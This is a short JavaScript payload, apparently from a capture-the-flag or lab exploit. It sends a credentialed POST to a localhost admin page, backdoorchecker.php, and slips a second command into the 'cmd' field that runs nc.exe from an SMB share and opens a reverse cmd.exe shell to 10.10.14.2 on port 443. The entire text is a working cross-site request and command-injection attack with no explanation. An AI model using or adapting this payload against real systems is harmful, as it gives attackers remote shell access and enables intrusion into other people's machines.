var xhr = new XMLHttpRequest();
var url = "http://localhost/admin/backdoorchecker.php";
var params = "cmd=dir | \\\\10.10.14.2\\share\\nc.exe 10.10.14.2 443 -e cmd.exe";
xhr.open("POST", url);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send(params);
